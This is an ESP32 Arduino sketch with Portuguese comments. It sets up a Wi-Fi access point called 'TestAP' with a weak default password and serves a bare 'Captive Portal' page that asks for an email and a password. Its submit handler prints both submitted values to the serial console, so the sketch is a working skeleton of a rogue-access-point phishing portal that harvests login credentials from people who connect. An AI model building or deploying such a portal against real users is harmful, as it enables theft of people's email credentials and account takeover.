#include <WiFi.h>
#include <ESPAsyncWebServer.h>

AsyncWebServer server(80);

void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);

  String apName = "TestAP";
  Serial.print("Criando AP com o nome: ");
  Serial.println(apName);

  // Configuração do AP com uma senha padrão
  if (!WiFi.softAP(apName.c_str(), "12345678")) {
    Serial.println("Falha ao criar o AP.");
    while (true) {
      delay(1000);
    }
  }

  Serial.println("AP criado com sucesso.");
  IPAddress IP = WiFi.softAPIP();
  Serial.print("IP do AP: ");
  Serial.println(IP);

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", "<html><body><h2>Captive Portal</h2><form action='/submit' method='post'><label>Email:</label><input type='text' name='email'><br><label>Senha:</label><input type='password' name='senha'><br><input type='submit' value='Enviar'></form></body></html>");
  });

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request){
    if(request->hasParam("email", true) && request->hasParam("senha", true)) {
      String email = request->getParam("email", true)->value();
      String senha = request->getParam("senha", true)->value();
      Serial.println("Email: " + email);
      Serial.println("Senha: " + senha);
      request->send(200, "text/plain", "Informações recebidas.");
    } else {
      request->send(400, "text/plain", "Parametros email e senha necessarios");
    }
  });

  server.begin();
  Serial.println("Servidor HTTP iniciado com sucesso.");
}

void loop() {
  // Código de loop vazio para este teste
}
